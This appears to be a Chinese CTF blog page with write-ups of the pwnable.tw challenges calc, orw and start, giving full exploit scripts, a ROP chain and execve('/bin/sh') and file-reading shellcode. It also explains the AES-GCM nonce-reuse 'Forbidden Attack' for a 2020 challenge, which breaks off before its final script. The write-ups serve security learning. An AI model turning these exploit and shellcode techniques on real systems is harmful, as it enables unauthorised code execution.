    <div class="article-meta">
      <a href="/2020/10/12/pwnable_calc/" class="article-date">
      <time datetime="2020-10-12T07:00:00.000Z" itemprop="datePublished">2020-10-12</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/12/pwnable_calc/">pwnable.tw calc</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>找到程序中可疑的写逻辑，即在parse_expr函数中的35行<code>a2[v4 + 1] = v9;</code>这里如果能控制a2使其写到ret address就能进行攻击。想法一比较简单，直接不断递增a2，因为输入的字符串长度为1024，因此可疑造成溢出，使其覆盖到ret address。但是checksec查看后发现程序有canary保护，因此难度较大。想法二，看了网上的writeup，发现可以用“+300+1”这类畸形输入控制a2（这里可以根据输入来模拟一下程序的执行流就会发现确实如此）。</p>
<p>尝试rop直接调用system函数，发现没有，/bin/sh字符串也没有，因此只能利用小gadget来完成system的系统调用。总体利用思路就是第一次输入先泄露ebp，获取栈地址信息。之后不断改变栈上的数据，构造rop链，需要注意的地方是计算栈上/bin/sh的地址。最后发送一个回车符（退出while循环）即可令程序执行我们的rop链完成攻击。</p>
<p>完整exp链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./calc')</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x080493FF")</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x08049432")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">" ===\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">ebp = int(p.recvuntil(<span class="string">'\n'</span>).strip()) + pow(<span class="number">2</span>,<span class="number">32</span>)</span><br><span class="line">input_base = ebp - <span class="number">1068</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x0805c34b : pop eax ; ret</span></span><br><span class="line"><span class="string">0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="string">0x08049a21 : int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"bin_addr: "</span>+hex(input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0x0805c34b</span>, <span class="number">11</span>, <span class="number">0x080701d0</span>, <span class="number">0</span>, <span class="number">0</span>, input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>, <span class="number">0x08049a21</span>, u32(<span class="string">'/bin'</span>), u32(<span class="string">'/sh\x00'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(target)):</span><br><span class="line">    p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i))</span><br><span class="line">    num = int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> target[i]&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">        target[i] -= pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> num == target[i]:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;target[i]:</span><br><span class="line">        d = num - target[i]</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'-'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = target[i] - num</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'+'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vlun/" rel="tag">vlun</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-pwnable_orw" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/11/pwnable_orw/" class="article-date">
      <time datetime="2020-10-11T07:00:00.000Z" itemprop="datePublished">2020-10-11</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/11/pwnable_orw/">pwnable.tw orw</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>程序开了沙箱，只能使用open，read，write函数。因此整个流程就是先打开文件，然后读取内容，最后把内容打印出来。</p>
<p>这里需要了解每一个系统调用的参数设置。</p>
<h4 id="open"><a href="#open" class="headerlink" title="open"></a>open</h4><p>eax = 0x05 系统调用号</p>
<p>ebx = filename 文件名</p>
<p>ecx = flags 置零即可</p>
<p>edx = mode 置零即可</p>
<p><strong>返回值</strong>eax = fd</p>
<h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>eax = 0x03  系统调用号</p>
<p>ebx = fd 文件指针</p>
<p>ecx = buf 缓冲区，存访读取内容</p>
<p>edx = len 读取的字节数</p>
<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>eax = 0x04  系统调用号</p>
<p>ebx = fd  文件指针，标准输出对应1</p>
<p>ecx = buf</p>
<p>edx = len</p>
<p>因此最终写出shellcode如下（需要注意的是文件名如何赋值）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx;</span><br><span class="line">push ecx;</span><br><span class="line">push 0x67616c66;</span><br><span class="line">push 0x2f77726f;</span><br><span class="line">push 0x2f656d6f;</span><br><span class="line">push 0x682f2f2f;</span><br><span class="line">mov ebx, esp;</span><br><span class="line">xor edx, edx;</span><br><span class="line">mov eax, 5;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, eax;</span><br><span class="line">mov ecx, esp;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 3;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">mov ebx, 1;</span><br><span class="line">mov edx, 0x30;</span><br><span class="line">mov eax, 4;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx, ecx;</span></span><br><span class="line"><span class="string">push ecx;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">push 0x2f77726f;</span></span><br><span class="line"><span class="string">push 0x2f656d6f;</span></span><br><span class="line"><span class="string">push 0x682f2f2f;</span></span><br><span class="line"><span class="string">mov ebx, esp;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string">mov eax, 5;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, eax;</span></span><br><span class="line"><span class="string">mov ecx, esp;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 3;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx, 1;</span></span><br><span class="line"><span class="string">mov edx, 0x30;</span></span><br><span class="line"><span class="string">mov eax, 4;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./orw')</span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-pwnable_start" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/11/pwnable_start/" class="article-date">
      <time datetime="2020-10-11T07:00:00.000Z" itemprop="datePublished">2020-10-11</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/11/pwnable_start/">pwnable.tw start</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>IDA无法反编译，只能看汇编，好在逻辑不复杂，简单来说就是一个write和一个read函数调用。如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure>
<p>翻译为C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buf[<span class="number">20</span>]=<span class="string">"Let's start the CTF:"</span>;</span><br><span class="line">    sys_write(<span class="number">1</span>,buf,<span class="number">20</span>);</span><br><span class="line">    sys_read(<span class="number">0</span>,buf,<span class="number">60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显存在栈溢出，而且程序没有开NX保护，直接使用shellcode，接下来就是如何布置shellcode以及获取栈地址信息的过程了。</p>
<p>这里需要了解一下Linux System Call 的调用规范：调用号放置在 <code>eax</code> 中，参数依次放入 <code>ebx</code>、<code>ecx</code>、<code>edx</code> 等寄存器中，之后 <code>int 80</code> 执行调用，返回值会放入到 <code>eax</code> 中。 因此这里为了获取栈地址，我们只能使用程序自带的write逻辑，因为需要把ecx设置为指向与栈地址相关的指针，这里实际上刚好在程序执行到retn的时候，esp指向的就是esp。因此我们只需要将ret address改为08048087，就能将ecx赋值为esp，然后通过write就能获取esp。之后二次read读取shellcode进行执行。</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'''</span></span><br><span class="line"><span class="string">xor    eax,eax</span></span><br><span class="line"><span class="string">push   eax</span></span><br><span class="line"><span class="string">push   0x68732f2f</span></span><br><span class="line"><span class="string">push   0x6e69622f</span></span><br><span class="line"><span class="string">mov    ebx,esp</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    al,0xb</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./start"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x8048087")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">esp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"esp:"</span>, hex(esp)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">shellcode = asm(SHELLCODE)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-2020-第五空间-UnSafeAES-Forbidden Attack" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/12/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-UnSafeAES-Forbidden%20Attack/" class="article-date">
      <time datetime="2020-07-12T14:35:59.670Z" itemprop="datePublished">2020-07-12</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/12/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-UnSafeAES-Forbidden%20Attack/">2020 第五空间 UnSafeAES Forbidden Attack</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    这次第五空间比赛中的密码学比较难，除了一道签到的都没做出来，还是太菜了orz</p>
<p>​    比赛快结束的时候队内大佬找到了UnSafeAES这道题目的攻击方法，但由于时间原因来不及复现，只好在赛后复现一下，发现这道题还是比较有意思的，因此想分享一下。</p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>​    这道题的攻击方法叫Forbidden Attack，事实上就是resused nonce attack，下面简单介绍一下。</p>
<h3 id="推导Authentication-Tag的多项式"><a href="#推导Authentication-Tag的多项式" class="headerlink" title="推导Authentication Tag的多项式"></a>推导Authentication Tag的多项式</h3><p>​    在AES-GCM加密模式中，Authentication Tag是通过有限域GF(2^128)进行一些列乘法所产生的，因此其最终结果可以用多项式来表示。下面将举例说明其多项式的表达式。</p>
<p><strong>场景一</strong>：假设Alice想利用AES-GCM加密16字节长的明文（plaintext）并使用16字节的相关消息（associated data）来产生相对应的认证标签。因此认证标签的计算结果将为：</p>
<blockquote>
<p>$g(X) = ((A_1X + C_1)X + L)X + S$</p>
</blockquote>
<p>等价于</p>
<blockquote>
<p>$g(X) = A_1X^3 + C_1X^2 + LX + S$</p>
</blockquote>
<p>其中$A_1$即为相关消息，$C_1$ 为加密明文所产生的密文，$L$ 等于 len(A) || len(C) ，$S$为$E_k(nonce+1)$，当$X=H$时有$g(H) = T$，这里$H$为认证密钥，$T$为认证标签。</p>
<p><strong>场景二：</strong>假设Alice想利用AES-GCM加密32字节长的明文（plaintext）并使用32字节的相关消息（associated data）来产生相对应的认证标签。因此认证标签的计算结果将为：</p>
<blockquote>
<p>$g(X) = ((((A_1X + A_2)X + C_1)X + C_2)X + L)X + S$</p>
</blockquote>
<p>等价于</p>
<blockquote>
<p>$g(X) = A_1X^5 + A_2X^4 + C_1X^3 + C_2X^2 + LX + S$</p>
</blockquote>
<p><strong>推广：</strong>从场景一以及场景二中，我们可以很容易的推导出产生Authentication Tag的通项式：</p>
<blockquote>
<p>$g(X) = A_1X^{m+n+1} + … + A_mX^{n+2} + C_1X^{n+1} + … + C_nX^2 + LX + S$</p>
</blockquote>
<h3 id="The-Forbidden-Attack"><a href="#The-Forbidden-Attack" class="headerlink" title="The Forbidden Attack"></a>The Forbidden Attack</h3><p>​    仍举例分析，为了简化考虑，我们假设Alice发送两次消息，两次消息的内容不同，但是均少于16字节，其中加密的结果分别记为$C_{1,1}$,$C_{2,1}$。同时用于计算认证标签的相关消息也均少于16字节，分别记为$A_{1,1}$,$A_{2,1}$。<strong>最重要的是</strong>，两次加密所使用的nonce相同。因此，我们可以得到以下两个式子：</p>
<blockquote>
<p>$g1(X) = A_{1,1}X^3 + C_{1,1}X^2 + L_1X + S$</p>
<p>$g2(X) = A_{2,1}X^3 + C_{2,1}X^2 + L_2X + S$</p>
</blockquote>
<p>注意以上的符号均为在有限域GF(2^128)下的多项式表达式，同时不足16字节的部分需要填充，$L_1$和$L_2$根据密文长度和相关消息长度得出。</p>
<p>​    作为攻击者，我们已知的信息有$C_{1,1}$,$C_{2,1}$,$A_{1,1}$,$A_{2,1}$,$L_1$,$L_2$，而$S$和$X$我们均未知，因此无法直接伪造签名。但是我们可以通过消除S使得未知数的个数减为一个并令多项式等于0，我们就可以通过求解一元三次方程获取到$X$的值。具体做法如下：</p>
<p>首先我们知道$g1(H) = T_1$，$g2(H) = T_2$。那么我们构造：</p>
<blockquote>
<p>$g1^{‘}(X) = A_{1,1}X^3 + C_{1,1}X^2 + L_1X + S + T_1$</p>
<p>$g2^{‘}(X) = A_{2,1}X^3 + C_{2,1}X^2 + L_2X + S + T_2$</p>
</blockquote>
<p>并且有$g1^{‘}(H) = 0$，$g2^{‘}(H) = 0$。然后我们计算$g1’(X) + g2’(X)$，记为$f(X)$，如下：</p>
<blockquote>
<p>$f(X) = (A_{1,1}+A_{2,1})X^3 + (C_{1,1}+C_{2,1})X^2 + (L_1+L_2)X + T_1 + T_2$</p>
</blockquote>
<p><strong>注意：</strong>有限域中多项式的加法运算等同异或。</p>
<p>我们成功的将$S$从表达式去消去了！然后我们又有$f(H) = 0$，因此我们可以简单的算出所有可能的$H$，并轻松的伪造签名，达到攻击的目的。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>​    有了以上的知识贮备后，接下来就是实战的环节了。在看完The Forbidden Attack的描述，我们知道为了达成伪造签名的目标，我们必须使得加密所使用的nonce相同并获取其加密结果。但在UnSafeAES这道题中中，似乎nonce无法被我们直接控制，而且加密前会检查该nonce是否已经使用过，因此如何让服务端使用相同的nonce进行加密不那么容易。</p>
<p>​    首先为了让服务端使用相同的nonce进行加密，我们可以对nonce进行00填充，因为我们注意到服务端在解析我们的输入时，不会检查nonce的长度，因此我们可以传输字符串不同，但是转为数字后相同的nonce。例如<code>nonce1 = &#39;\x00&#39;+ &#39;A&#39;*11</code>, <code>nonce2 = &#39;A&#39;*11</code>，尽管<code>nonce1 != nonce2</code>，但是<code>bytes_to_long(nonce1) == bytes_to_long(nonce2)</code>，因此我们可以通过这种方法来绕过检查。但是我们无法直接发送带00填充的nonce，因为服务端在解析输入后会首先进行解密，其中就包括验证部分，假如验证失败，就会退出。但是细心的朋友肯定已经注意到题目代码中的不寻常之处，在client函数中有以下代码片段</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(data)</span>:</span></span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">b"ctf.server/test?message="</span> + ct</span><br><span class="line">        nonce = hashlib.sha256(url).digest()[:<span class="number">12</span>]</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>这里把nonce设置为sha256为计算的结果，因此我们控制sha256计算出的结果，使其带有00填充。由于后续我们需要多次加密，因此我控制sha256计算出的结果头部含有三个00填充，爆破脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">'ctf.server/test?message='</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(range(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">	m = <span class="string">''</span>.join(map(chr, comb))</span><br><span class="line">	<span class="keyword">if</span> sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>].startswith(<span class="string">"\x00\x00\x00"</span>):</span><br><span class="line">		send = (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">		nonce = sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>]</span><br><span class="line">		<span class="keyword">print</span> m.encode(<span class="string">'hex'</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>最终我们可以得到<code>m.encode(&#39;hex&#39;) = &#39;9cd872&#39;</code></p>
<p>​    这样，当我们<strong>第一次发送数据</strong>时，我们可以发送<code>9cd87241414141414141414141414141414141414141414141414141</code>使得nonce的首三个字节均为<code>&#39;\x00&#39;</code>。然后我们获取到服务器第一次打印出的数据，记为client1，然后为了让程序接下来继续使用我们构造的nonce去加密，我们在<strong>第二次发送数据</strong>时发送将client1中nonce部分的首字节删除（即删除一个<code>&#39;\x00&#39;</code>）后的字符串，此时服务端解析后的nonce尽管和第一次nonce相比少了一个<code>&#39;\x00&#39;</code>，然而实质相同。然后我们获取到服务器打印出的数据，记为server1。在<strong>第三次发送数据</strong>时发送将server1中nonce部分的首字节删除（即删除一个<code>&#39;\x00&#39;</code>）后的字符串，此时的nonce尽管和前两次都不同，但是实质相同。然后再次获取到服务器打印的数据client2。到此我们已经获取到了client1，server1，client2。然后我们需要用client1，client2来计算认证密钥$H$。具体步骤如下：</p>
<p>​    首先我们获取到client1中的三块加密结果（分别16字节，16字节，4字节）以及client2中的三块加密结果，并将其转为多项式，分别记为$C_{1,1}$，$C_{1,2}$，$C_{1,3}$，$C_{2,1}$，$C_{2,2}$，$C_{2,3}$。注意$C_{1,3}$和$C_{2,3}$需要填充。同时获取到client1和client2中的tag部分，记为$T_1$，$T_2$，并计算$L_1$，$L_2$。同时记相关消息的多项式表达（<code>&quot;from client&quot;</code>）为$A$。然后我们就有：</p>
<blockquote>
<p>$g1’(X) = AX^5 + C_{1,1}X^4 + C_{1,2}X^3 + C_{1,3}X^2 + L_1X + S + T1$</p>
<p>$g2’(X) = AX^5 + C_{2,1}X^4 + C_{2,2}X^3 + C_{2,3}X^2 + L_1X + S + T1$</p>
<p>$f(X) = g1’(X) + g2’(X) = (C_{1,1}+C_{2,1})X^4 + (C_{1,2}+C_{2,2})X^3 + (C_{1,3}+C_{2,3})X^2 + (L_1+L_2)X + T_1 + T_2$</p>
</blockquote>
<p>同时我们知道$C_{1,1} = C_{2,1}$，$L_1 = L_2$。因此可化简为：</p>
<blockquote>
<p>$f(X) = (C_{1,2}+C_{2,2})X^3 + (C_{1,3}+C_{2,3})X^2 + T_1 + T_2$</p>
</blockquote>
<p>根据$f(H) = 0$，我们可解出所有可能的解。然后篡改解密消息同时伪造签名，发送给服务端。具体过程如下：</p>
<p>首先利用字节翻转将client2中的消息进行篡改，使得解密后特定位置字符串为<code>&quot;flag&quot;</code>，然后伪造签名。为了伪造签名，我们需要计算出$S$，因为$g(X) = AX^5 + C_{1}X^4 + C_{2}X^3 + C_{3}X^2 + LX + S$（其中$S$未知）。因此为了计算出$S$，我们构造函数$f2(X) = AX^5 + C_{1}X^4 + C_{2}X^3 + C_{3}X^2 + LX +T$, 那么我们就有$f2(H) + S = 0$，因此$S = f2(H)$，之后我们将$S$代入$g(X)$即可计算出相对应的签名。</p>
<p>​    我们记对client2中密文部分进行字节反转后的结果为c，伪造签名为t，对client2中的nonce部分的首字节删除后（删除<code>&#39;\x00&#39;</code>）的nonce结果为n，那么<strong>最后一次发送数据</strong>时我们将发送c+t+n。于是我们就能得到服务端打印出的对flag进行加密的结果，简单计算后发现len(flag) = 23，小于client1中的密文长度，因此直接对其进行字节翻转得到flag。</p>
<p>关键脚本部分如下：</p>
